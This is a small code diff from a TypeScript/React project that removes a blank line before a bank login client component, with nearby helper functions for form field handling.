@@ -199,7 +199,6 @@ function shouldResetPreviousBankField(key: string): boolean {
 function hasMeaningfulSubmitValue(value: unknown): boolean {
   return typeof value === "string" && value.trim().length > 0;
 }
-
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
